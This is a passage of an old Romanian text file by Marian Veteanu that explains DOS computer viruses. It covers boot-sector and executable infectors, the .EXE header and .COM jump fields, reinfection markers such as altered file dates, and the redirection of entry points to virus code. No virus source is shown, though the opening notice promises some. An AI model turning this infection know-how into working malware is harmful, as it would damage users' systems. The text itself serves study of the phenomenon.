

                     DESPRE CEEA CE SE CHEAMA "VIRUS"...

                      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                      ³ (c) VMA soft - Marian Veteanu³
                      ³ Email : vma@electra.upit.ro  ³
                      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


 ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
 º                                                                    º
 º                           NOTA IMPORTANTA                          º
 º                                                                    º
 º                                                                    º
 º           Informatia din acest fisier se adreseaza utilizatorilor  º
 º     cu nivel mic si mediu de cunostiinte in acest domeniu . Acest  º
 º     fisier este creat in special pentru a face o cercetare a       º
 º     fenomenului numit virus informatic si nu pentru a produce      º
 º     pagube pe calculatoare.                                        º
 º     Desigur informatia prezentata este suficienta pentru a produce º
 º     virusi destul de periculosi, dar nu recomand asta, in fond nu  º
 º     rezolvi nimic creand virusi. La sfarsitul fisierului sunt date º
 º     sursele complete a cativa virusi perfect functionabili.        º
 º                                                                    º
 ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

     Inconjurati  de  legende  si  de  mister  ,  virusii  par a fi un fel de
O.Z.N.-uri  ale calculatoristilor ; se vad dar nu se prea pot dovedi, se stiu
face invizibili, se transforma in cele mai neasteptate moduri. Pot fi acuzati
de cele mai nastrusnice lucruri si nu rareori sint in stare de ele.

     Ideeea  de  a juca feste colegilor este mai veche decit computerele, dar
in  domeniul  informatic  abia  odata  cu  aparitia acestora s-a dezvoltat pe
deplin.Prin  anii  70'  festele  erau  orientate  pe  mesaje  pe ecran sau la
imprimanta.Se  studia  mutra  sefului  in timp ce acesta citea la intrarea in
sistem  :  "Avertisment  :  Un utilizator cu indicele de inteligenta sub 30 a
intrat in sistem".
     Stramosii  virusilor  de  computere si-au facut aparitia pe la inceputul
anilor  '80.  Erau  de  fapt  niste  mici programe utile pentru "victima" dar
care  aveau  in  corpul  lor si un modul periculos. Cu putin noroc victima se
apuca  sa  povesteasca  "ciudateniile"  care i se intimplasera de la o vreme.
Astfel gluma era completa. Asa au aparut primii "Cai Troieni" informatici !






               1.  Virusii - o posibila definitie ...


     Un  virus  informatic  este  un  program  care  poseda proprietatea de a
introduce  copii  executabile  ale  lui  insusi  in alte programe sau in alte
sectoare  vulnerabile  ale  unui  sistem  de  calcul,  cu scopul de a altera,
schimba sau sterge continutul altor programe sau date.

     Un  program  este  considerat  ca  fiind virus daca prezinta urmatoarele
proprietati :

        I.   1. - modifica programe de sistem sau utilizator prin includerea
             propriilor sale structuri in acestea.

        II. Ramificare in doua tipuri :
          a. 2. - recunoaste ca un program este deja infectat.
             3. - daca recunoaste un program deja infectat, el va interzice o
             noua modificare.
          b. 2. - recunoaste ca un program este deja infectat.
             3. - desi recunoaste un program infectat, el permite o noua
             modificare ducind pina la urma la gituirea sistemului.

        III.4. - programul modificat prezinta de acum proprietatile 1 - 3.


     Programele  "atacatoare"  ce  nu  poseda  simultan  aceste nu pot fi in-
cadrate  strict in categoria de virusi ci numai in alte subramuri ale acestei
categorii ca : vierme, cal troian sau bomba logica.

     VIERMELE  este  un  program  care,  odata ajuns intr-o retea de calcula-
toare, devine activ intr-o statie de lucru in care nu se ruleaza nici un pro-
gram.
     CALUL TROIAN este un program care aparent este folositor dar, intoc- mai
ca stramosul sau, are scopul de a distruge cit mai mult.
     BOMBA  LOGICA  este  un  cal  troian  cce ataca fisierele ; un astfel de
program  poate avea acces la diferite zone ale memoriei, la care utilizatorul
nu  are acces in mod normal ( tabela a vectorilor de intrerupere ). Spre deo-
sebire  de  celelalte  tipuri de soft agresor, bomba logica se caracterizeaza
printr - un efect distructiv puternic si intotdeauna necontrolat.






               2. Tipuri de virusi


     Referindu  - ne numai la virusi, a caror definitie, cit de cit exacta se
gaseste mai sus, acestia se impart in doua mari tipuri :

         I. - Virusi care ataca sectorul de boot, si a caror activare se
            face la incacrcarea sistemului de operare.
         II.- Virusi care ataca fisierele, in special cele executabile, si
            care sint lansati la executarea fisierelor infectate.

     Dar  si  aceste  mari  categorii se impart in subcategorii in functie de
modul de infectare si de tipul infectarii :

         I. - Virusi ce se instaleaza numai in primul sector al sectorului
            de boot.
            - Virusi se instaleaza in doua parti : in primul sector "capul"
            iar in alte sectoare "corpul".
         II.- Virusi ce infecteaza fisiere .COM.
            - Virusi ce infecteaza fisiere .EXE.
            - Virusi care infecteaza alte tipuri de fisiere binare: OBJ ,OVL



              2.1  VIRUSII DE BOOT


     Pentru  a  intelege comportamentul virusilor care infecteaza sectorul de
autoincarcare  al  discurilor-sistem  prezentam  acum citeva elemente referi-
toare  la  incarcarea  sistemului  de operare Ms-Dos.Incarcarea sistemului de
operare  este  adeseori  un  moment favorabil pentru patrunderea virusilor in
sistem.

     Lansarea sistemului incepe cu parcurgerea urmatoarelor secvente:
     1. Este executat programul de autotestare - POST (Power-On Self Test)
     2. Se face o anumita initializare a sistemului.
     3. Se incearca citirea primului sector al discului sistem,

     1.  Programul  POST  disgnosticheaza  echipamentele instalate ( se veri-
fica memoria RAM, perifericele instalate, etc. )
     2.  In  perioada  de  initializare  se actualizeaza tabela vectorilor de
intrerupere,  se  initializeaza  unele  elemente  hard, se verifica existenta
extensiei  ROM-BIOS.Incarcatorul  ROM-BIOS este un program scurt care incarca
in memorie primul sector din discul sistem.
     3.  Primul  sector  din  discul  sistem  contine  un incarcator specific
sistemului  Ms-Dos si este numit sectorul de auto-incarcare. Daca discul este
un  disc  sistem  el  va  contine o copie completa a sitemului de operare. In
acest  caz  in primul sector se gaseste un scurt program a carui sarcina este
sa  in- ceapa procesul de startare a sistemului Dos din disc, citind din disc
in me- morie prima parte a programelor Dos. Primul sector contine se asemenea
blocul parametrilor BIOS.


                    Structura primului sector este :


  ÉÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
  º  Adresa  ³                Continut                  ³ Marime in bytes º
  ÌÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
  º   00h    ³    Instructiune de salt la inceputul     ³       3         º
  º          ³       programului de autoincarcare       ³                 º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   03h    ³         Numele si versiunea S.O.         ³       8         º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   0bh    ³     Dimensiunea sectorului in octeti     ³       2         º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   0dh    ³   Dimensiunea unui cluster in sectoare   ³       1         º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   0eh    ³   Numarul de sectoare ocupate pina la    ³       2         º
  º          ³        prima copie a FAT - ului          ³                 º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   10h    ³     Numarul de copii ale FAT - ului      ³       1         º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   11h    ³   Numarul maxim de intrari in radacina   ³       2         º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   13h    ³  Numarul total de sectoare ale discului  ³       2         º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   15h    ³  Tipul discului, identic cu primul octet ³       1         º
  º          ³    din tabela de alocare a fisierelor    ³                 º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   16h    ³      Numarul de sectoare pentru FAT      ³       2         º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   18h    ³       Numarul de sectoare pe pista       ³       2         º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   1ah    ³   Numarul de fete ( capete de citire )   ³       2         º
  ÇÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
  º   1ch    ³  Numarul sectoarelor din fata sectorului ³       4         º
  º          ³ de incarcare ( sectoare ascunse ). Egal  ³                 º
  º          ³ cu 0 pentru discheta, iar pentru HD con- ³                 º
  º          ³     tine numarul sectoarelor din fata    ³                 º
  º          ³              partitiei Dos.              ³                 º
  ÈÍÍÍÍÍÍÍÍÍÍÏÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÏÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼


     Programul de autoincarcare este lansat de incaracatorul ROM-BIOS care nu
are  nici  o  informatie  despre structura bloc - logica a discului. Prin ur-
mare  el  ajunge la primul octet din disc si il executa ca pe o instructiune.
Instructiunea  de  salt  (primii  3  octeti) care permite programului sa sara
peste Blocul de Parametrii Bios are una din urmatoarele formele :

        a. salt absolut (e9h) cu 2 octeti de deplasare : E9 XX XX
        b. salt relativ (ebh) cu un octet de deplasare si o instructiune
           neoperativa (NOP - 90h)  : EB XX 90

     Este  interesant  de  stiut  ca  sectorul  de autoincarcare exista si la
discu- rile care nu sunt de tip discuri sistem. In acest caz, sarcina acestui
sector este de a semnala eroare la incercarea de incarcare a sistemului de pe
un disc fara sistem de operare.
     Exista   o   clasa  intreaga  de  virusi  care  infecteaza  sectorul  de
autoincarcare cum ar fi Brain, Bouncing Ball (sau Ping - Pong), virusii Stone
si altii.
     Intrucit sectorul de autoincarcare ocupa numai 512 octeti, nu virus care
infecteaza acest sector se va instala in intregime in sector numai daca are o
lungime  mica  (de exemplu, virusii Stone). Altfel va trebui sa se imparta in
doua  parti  : "capul" virusului se va instala in sectorul boot, iar "corpul"
virusului  in alte sectoare, de obicei mai putin folosite, pe care apoi le va
declara ca sectoare defecte. Prin aceasta isi asigura o sedere netulburata in
sistem.
     Primul  lucru  pe  care  il  va  face virusul consta in a se copia pe el
insusi  in  RAM, unde va ramine rezident. Un virus ajuns in RAM este activ el
putind infecta orice disc ce va fi folosit.

     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
     ³ ROM - BIOS                          ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ ROM sau RAM                         ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ COMMAND.COM (tranzient)             ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´     }
     ³                                     ³     }    Virusul se copiaza
     ³   RAM liber                         ³     }    in aceasta parte a
     ³                                     ³     }    memoriei.
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´     }
     ³ COMMAND.COM                         ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ Drivere din Config.Sys              ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ Blocurile de Control Ale Fisierelor ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ Bufferele disc                      ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ Tabelele MS-DOS                     ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ MSDOS.SYS                           ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ IO.SYS                              ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ Tabelele ROM-BIOS                   ³
     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
     ³ Tabela Vectorilor de Intrerupere    ³
     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

     Numai  dupa  ce s-a activat, virusul permita sistemului sa - si deruleze
algoritmul  de  incarcare.  Daca incarcarea sistemului solicita mai mult timp
decit de obicei e un indiciu serios ca putem avea sistemul infectat.
     Un  utilizator  atent  poate sesiza cresterea timpului la autoincarcarea
si, respectiv, in celelalte operatii cu discul.




             2.2   VIRUSII DE FISIERE EXECUTABILE


     Pentru  a-si  putea  duce  la  indeplinire  misiunea distructiva virusul
trebuie  sa  beneficieze de lansarea in executie a altor programe si camuflat
sa-si  realizeze  si  obiectivele  proprii.  El  va alege practic ca mediu de
evolutie  orice  program  susceptibil  de a fi incarcat in memoria principala
si  executat. Acest lucru explica de ce sint afectate cu prioritate fisierele
de tip EXE si COM.
     Sarcina  de a se atasa unui program executabil nu este deloc usoara, mai
ales  cind  acest  lucru se doreste a fi cit mai discret posibil si sa treaca
neobservat o perioada de timp cit mai mare.
     Asadar,  sa privim in detaliu, cu multa atentie intregul mecanism fixare
a virusului in fisierele care contin cod executabil.
     Cel  putin  citeva  aspecte  sint  fundamentale  in indeplinirea acestei
functii si se impun a fi studiate pe masura :

        1. Cum sint alese fisierele ce vor fi infectate.
        2. Cum se evita implantarea intr-un program deja infectat.
        3. Cum se implanteaza practic in programul executabil.

     1.Alegerea  tipului fisierelor ce urmeaza a fi infectate se face simplu,
dupa  informatia  de  tip  (EXE,  COM)  asociata fiecarui fisier in catalogul
fisierelor(in intrarea in director).

     2.Implantarea  virusului  pe  un program deja infectat nu s-ar justifica
pentru  ca, pe de o parte, ar mari excesiv dimensiunea fisierului, pe de alta
parte, lansarea in executie a programului este valorificata o singura data de
virus,  lucru  realizabil  de  secventa  virala deja existenta.In aceste con-
ditii  modulul de proliferare trebuie sa aiba capacitatea de a discerne intre
un program deja infectat si unul neinfectat.
     In  general  un  virus este capabil sa recunoasca infectarea programului
gazda  dupa  semnatura sa proprie. Aceasta metoda poate fi aplicata cu succes
cu  pretul a citorva bytes continind aceasta componentasi plasati intr-un loc
usor de gasit, la inceputul sau la sfirsitul secventei virale.
     Alte  mecanisme,  cu  nimic  mai  complexe  decit acesta, se folosesc de
faptul  ca  utilizatorul  nu  beneficiaza in mod curent din partea sistemului
de  toate  informatiile,  unele  minore,  existente despre fisiere. Astfel un
virus  poate  insuma  100  ani,  spre  exemplu,  la data ultimei actualizari.
Intrucit  sistemul  nu  ofera  utilizatorului  decit  ultimele doua cifre ale
anului  ultimei modificari mecanismul este cu atit mai eficient si mai rapid,
cu  cit  nu  presupune  in  faza de proliferare a virusului decit consultarea
cataloagelor  de  fisiere  si  nu  deschiderea  fisierelor  propriu-zise,  in
situatia in care ele sint deja contaminate.

     3.Implementarea in fisierele executabile este cea mai importanta functie
a  virusilor. In functie de modul de implementare a acestei functii se deose-
besc citeva tipuri de virusi informatici :
        a. Virusi care suprascriu portiunea de la inceputul programului.
        b. Virusi care nu suprascriu zone din programul purtator.

     a.  In  cazul acestui tip de virus efectul distructiv se manifesta numai
dupa  proliferarea virusului in intregul sistem. Prin suprascrierea unei zone
din program cresc sansele aparitiei unor anomalii in functionare, contribuind
decisiv la desconspirarea virusului. De altfel acest tip de virus este foarte
putin raspindit.

     b.  Acesti virusi de implanteaza intr-un fisier continind program execu-
tabil, marind dimensiunea fisierului cu lungimea secventei perazite. In cazul
virusilor  care nu suprascriu programul purtator, sansa depistarii virusului,
fara  un  program antivirus adecvat, este mica deoarece comportamentul siste-
mului este perfect normal, neinregistrindu-su decit mici intirzieri la incar-
carea programelor in memorie.



        2.3 MODUL DE IMPLANTARE

        2.3.1 Virusii de fisiere .EXE

     Antetul unui fisier .EXE

     ÉÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÑÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
     ºDeplasament³Dim.³ Nume          ³ Continut                        º
     ÌÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍØÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
     º    0h     ³  2 ³    4Dh 5Ah    ³ Semnatura programelor EXE (MZ)  º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º    2h     ³  2 ³    PARTPAG    ³ Lungimea paginii partiale la    º
     º           ³    ³               ³  sfirsitul programului          º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º    4h     ³  2 ³    PAGECNT    ³ Lungimea in pagini de 512 bytes º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º    6h     ³  2 ³    RELOCNT    ³ Numarul inregistrarilor din     º
     º           ³    ³               ³  tabela de relocare             º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º    8h     ³  2 ³    HDRSIZE    ³ Dimensiunea antetului in        º
     º           ³    ³               ³  paragrafe de 16 bytes          º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   0Ah     ³  2 ³    MINMEM     ³ Minimul de memorie necesar dupa º
     º           ³    ³               ³  program                        º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   0Ch     ³  2 ³    MAXMEM     ³ Maximul de memorie necesar dupa º
     º           ³    ³               ³  program                        º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   0Eh     ³  2 ³    RELOSS     ³ Deplasamentul pentru segmentul  º
     º           ³    ³               ³  de stiva                       º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   10h     ³  2 ³    EXESP      ³ Valoarea pentru registrul SP    º
     º           ³    ³               ³  la lansare                     º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   12h     ³  2 ³    CHKSUM     ³ Suma de control a fisierului    º
     º           ³    ³               ³  (suma negativa a tuturor       º
     º           ³    ³               ³  cuvintelor fisierului)         º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   14h     ³  2 ³    EXEIP      ³ Valoarea registrului IP la      º
     º           ³    ³               ³   lansarea in executie          º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   16h     ³  2 ³    RELOCS     ³ Deplasamentul pentru segmentul  º
     º           ³    ³               ³  de cod                         º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   18h     ³  2 ³    TABLEOFF   ³ Deplasamentul primei inregis-   º
     º           ³    ³               ³  trari de relocare              º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   1Ah     ³  2 ³    OVERLAY    ³ Numarul de suprapuneri          º
     ÇÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
     º   1Ch     ³  4 ³               ³ Dimensiunea zonei formatate a   º
     º           ³    ³               ³  antetului .EXE                 º
     ÈÍÍÍÍÍÍÍÍÍÍÍÏÍÍÍÍÏÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÏÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼


     Modul  de  actiune  al  virusilor  de fisiere .EXE consta in modificarea
valorilor importante din antetul fisierelor .EXE. Astfel un virus va modifica
intotdeauna  valoarea registrului IP si a deplasamentului pentru segmentul de
cod  astfel  incit sa pointeze pe prima intructiune a virusului. Acesta, dupa
realizarea  secventei  sale  de  program  reda controlul programului purtator
printr-un salt la adresele originale continute in antet.
     De  aici  rezulta ca virusul trebuie sa pastreze in corpul sau si infor-
matii  referitoare  la saltul original la inceputul programului. De altfel pe
aceste  informatii  din corpul virusului se bazeaza programele antivirus care
cauta si scot virusii din fisierele infectate.
     Alte  informatii  importante  frecvent modificate de virus sint deplasa-
mentul  pentru  segmentul  de stiva si valoarea registrului SP la lansare. Ca
si  in  cazul  anterior, informatiile trebuiesc retinute in corpul virusului,
aceasta  ducind  la  cautarea  respectivelor informatii in corpul programului
infectant si inlocuirea valorilor originale in antetul fisierului.
     Odata  cu  marirea  dimensiunilor  fisierului  trebuiesc  modificate  si
informatiile  privitoare la lungimea paginii partiale de la sfirsitul progra-
mului precum si dimensiunea in pagini de 512 bytes a programului.
     Odata  modificate  aceste informatii nu mai sint retinute in cadrul pro-
gramului  agresor  ci  sint  calculate dinamic. Un program antivirus nu cauta
secventele in corpul virusului ci calculeaza aceste valori scazind din lungi-
mea programului infectat lungimea virusului si modificind in cadrul antetului
aceste valori.



        2.3.2 Virusii de fisiere .COM

        Antetul unui fisier .COM

     De  fapt fisierele .COM nu contin un asa numit antet ele fiind precedate
numai de 3 bytes de salt la inceputul codului executabil al pro- gramului.
     In  cazul  acestor  fisiere  infectarea  este  mult  mai  simpla virusul
neumblind  decit  la  aceste  valori, rescriidu - le astfel incit sa pointeze
pe  secvente  proprie  de inceput predind controlul programului original dupa
propria sa executare.

        ÚÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
        ³  A  ³ Date  ³ Cod executabil ³
        ÀÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        ÚÄÄÄÄÄÂÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄ¿
        ³ A+B ³ Date  ³ Cod executabil ³ Cod Virus ³  A  ³
        ÀÄÄÄÄÄÁÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÙ

        A - salt original la inceputul codului executabil
        B - lungime Cod executabil


        2.4 Modulul de camuflare


     Daca  in  formele  primitive virusii isi impuneau oarecum cu brutalitate
me-  sajul  purtator  de dezastre, in formele lor evoluate abilitatea de a se
impune  a  crescut,  facindu-i  mai  de temut ca oricind. O functiune noua se
contura  tot  mai  mult,  aceea  de camuflare a actiunii virusului, cel putin
pentru  o  perioada  de  timp  ; pina la instaurarea unei stari favorabile in
sistem,  pina  la  un  mo-  ment  propice  pentru deconspirare, cind procesul
distructiv  devenise  ireversibil,  totul  trbuia  sa para absolut normal. In
foarte  multe  cazuri  toata  actiunea  viru-  lui se desfasoara cu discretie
totala.  Urmarirea unor obiective de genul procu- rarii de avantaje materiale
